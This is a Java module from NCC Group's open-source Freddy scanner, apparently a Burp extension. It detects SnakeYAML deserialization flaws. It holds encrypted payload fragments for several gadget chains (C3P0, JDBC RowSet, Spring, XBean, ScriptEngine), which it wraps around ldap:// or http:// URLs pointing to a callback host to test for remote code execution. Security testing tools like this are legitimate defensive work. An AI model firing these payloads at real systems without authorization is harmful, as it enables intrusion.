// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java SnakeYAML library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class SnakeYAMLModule extends FreddyModuleBase {
    //C3P0RefDataSource payload data
    private final String C3P0REF_PREFIX = decrypt("tr6wQuzWjwSMw6kjW+vPCY1+UaDYgnZgJPhbblAaJHCifYJYQMcssbxDhzLByO6JbUANylbsl7ybK8bdAXywhQ==");
    private final String C3P0REF_SUFFIX = decrypt("PVAS6TS/5TBfpVpGGjJTkAZqhiCWjRIAbePppjSLDAw=");

    //CommonsConfiguration payload data
    private final String CC_PREFIX = decrypt("+LIZ5K0t7Pk4K4TsfE2MNmNfYeglVVSFa1GkJwxQXHsMahAvKKfqrWz/9+4DmD0u1/yVL+Rm80rzN628rmO7c9aiBwB4O8r8HCNHWHhfpvGz7TX1CM/pZaMuz0LLXrSuiWQG75PM7c/D7XKBRIJULMuuoAwHIiaEUxRh/LEiiSqFJow2zffokiPcm0QOdQewt+X38mx7/Ch2WiKn2ASrxA==");
    private final String CC_SUFFIX = decrypt("Y4kNn3UtdvZhss52oB8yog==");

    //JdbcRowSet payload data
    private final String JDBC_PREFIX = decrypt("atVodCMpjaH/tI9J6UaQqma196+Ek5phf34Ypz0O+XqhSRSB9EIF15yjvPu63tDVpDMfqn/ZIS0gHuEpcQIOSg==");
    private final String JDBC_SUFFIX = decrypt("PSBgh3i/81Trr82RmEftudpN7s7z6DOokyI2iPa91uU=");

    //ResourceGadget payload data
    private final String RG_PREFIX = decrypt("ZyhrHFZuW5B8y61ow0r0wjM98dyV2lIDSTQcm4Y/rq3a4IzfxnJ0APfji7ksL+qUP0ZptUyoOlhK1Ci7os7eCFj7+GbQXIG82FFJO5fFGFhzwcMpM2y5DCH6kSfr4JOx");
    private final String RG_SUFFIX = decrypt("O5t6JAIbTtRbeYDkiZVj2y83gb//0O0XMxbRHAWYYH5Acy0zYZp++PD0oJntM9M+D0lNgs7FseNCQVOZjbxo/OkIUBPW59bP261zdSax1pzK9V5uXvzAcmq6jUFkFEbI");

    //ScriptEngine payload data
    private final String SE_PREFIX = decrypt("pK4NP3liInk+q5UTeHFPTcPbJ475uz4Iy7MQ2lXjljKQLHdbMPeLSsPQYBwMI57tlmLLvu2YDodFPiG1Dde0Y2HvFHBotHl/KDPAX2KQpUmtvq80Vv/06d2+G1ZJBk1N");
    private final String SE_SUFFIX = decrypt("JfU+vW/TQgxSFMEDJ9f0oA==");

    //SpringAbstractBeanFactory payload data
    private final String SABF_PREFIX = decrypt("mLfP6DGgDZ9M4PNGwD/x6JMkwz7qTjQJqxWVN6GIpMXPW7el8kwL/57a6AvEXfUbHywGisuhiqJVxN0OXiqCOHbgCcTjPDF/GMNzrzSjcVOmXe/0xUbXe5jb1wDEOTuUFOHNDjv4LZAr9mOW6bMu2g==");
    private final String SABF_MIDDLE = decrypt("KiDBqQDnBVeJeYCcd5lEBOECK+YsHp67m7N1PmjO84sybATdae6mit74KZ/pLnghf+kYA5Bi2DF8wFtOQp3Pm8gx/MFc4PBBuKXjiAIhplqM4tylBwc3DPBPzaeCuLRrrX6sNITiNAXE0S0d+rG3eg==");
    private final String SABF_SUFFIX = decrypt("9pDXcQIZxaRxOJhpNDmBa5b8naShFSVgMl8QNEBw4eqebUjdgN9u2b6ZFQs/jPI/BfOG8R4RaPNjFYYjGEA3hqaSDHXCJzxmvHr5VCrhXHY=");

    //SpringPropertyPathFactory payload data
    private final String SPPF_PREFIX = decrypt("umx6pgbpVKiuYlfK8y58prOrrLH3wOomN2tj0R8yxXnDIdo8+k6UReTWgEskH921wErdtrJdl2f+g1Cg0mCBq5okxZLN61/CqldJWfPN83c1bZQS8C8Yex6L2ERa6eGm");
    private final String SPPF_MIDDLE = decrypt("v8Rod35reAvZ5m+wWdZZ2DJGBtVPN6XaXmf51BGC1eeuj/FWgi100riQdJvSKf7wPOjQ4jTTlgJTXIOwnQqaRswdrlaGZJGYs+zReXelfQCv/ka6uMEB/fp0I+2fJykgjOLcpQcHNwzwT82ngri0a61+rDSE4jQFxNEtHfqxt3o=");
    private final String SPPF_SUFFIX = decrypt("xPotKoJ+yNDtUL7SPupSkQ==");

    //XBean payload data
    private final String XBEAN_PREFIX = decrypt("/EBquv1Ssr1fAcBZrrRZw/Mw0kBpmC8L+LvPlTzBVqPq/DbUt038MwiGDj6Dj4qiTq5z7Tc66ZMni/mUUEbZQ9rBOZ+9xGlQY+NIQOmwkZYYVqv2y5/lZSthQzn7wW10bFi76n0IO618weKnFb4BP1To5i1s5qOJBW9OSHbgOnvmkJtuBnkvuCoyiiq9jVVv1DnlQiMvEbJ9sedxJ5cHZBThzQ47+C2QK/ZjlumzLto=");
    private final String XBEAN_SUFFIX = decrypt("olyPP0uUeevi9N6GFY89BSFiZmA3h5Q9QqKiRwzLBnad7KmZ6/zqbX7NMoOHCapBUIMdAsTNLJ6Ez36aazVivQ==");

    protected void initialiseModule() {
        setName("SnakeYAML");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("exception", Pattern.CASE_INSENSITIVE), Pattern.compile("org\\.yaml\\.snakeyaml")}, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("'", "found unexpected end of stream");

        registerActiveScanCollaboratorPayload(PN_C3P0RDS, false);
        registerActiveScanCollaboratorPayload(PN_COMMONSCONFIG, false);
        registerActiveScanCollaboratorPayload(PN_JDBC, false);
        registerActiveScanCollaboratorPayload(PN_RESOURCE, false);
        registerActiveScanCollaboratorPayload(PN_SCRIPT, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, false);
        registerActiveScanCollaboratorPayload(PN_XBEAN, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0RDS:
                return C3P0REF_PREFIX + "ldap://" + hostname + "/" + C3P0REF_SUFFIX;

            case PN_COMMONSCONFIG:
                return CC_PREFIX + "ldap://" + hostname + "/" + CC_SUFFIX;

            case PN_JDBC:
                return JDBC_PREFIX + "ldap://" + hostname + "/" + JDBC_SUFFIX;

            case PN_RESOURCE:
                return RG_PREFIX + "http://" + hostname + "/" + RG_SUFFIX;

            case PN_SCRIPT:
                return SE_PREFIX + "http://" + hostname + "/" + SE_SUFFIX;

            case PN_SPRINGABF:
                return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_MIDDLE + "ldap://" + hostname + "/" + SABF_SUFFIX;

            case PN_SPRINGPPF:
                return SPPF_PREFIX + "ldap://" + hostname + "/" + SPPF_MIDDLE + "ldap://" + hostname + "/" + SPPF_SUFFIX;

            case PN_XBEAN:
                return XBEAN_PREFIX + "http://" + hostname + "/" + XBEAN_SUFFIX;
        }
        return null;
    }
}
